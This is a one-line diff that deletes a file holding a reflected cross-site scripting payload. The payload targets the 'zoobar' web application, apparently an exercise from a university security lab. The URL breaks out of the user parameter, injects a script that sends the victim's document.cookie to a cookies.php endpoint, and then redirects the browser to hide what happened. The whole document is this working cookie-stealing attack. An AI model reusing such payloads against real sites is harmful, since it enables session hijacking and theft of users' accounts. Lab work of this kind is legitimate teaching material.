@@ -1,1 +1,0 @@
-http://zoobar.stanford.edu/users.php?user="><script>var x=new XMLHttpRequest();x.open("GET","http://zoobar.stanford.edu/cookies.php?cookie="%2Bdocument.cookie,false);x.send();window.location.replace("http://zoobar.stanford.edu/users.php")</script>
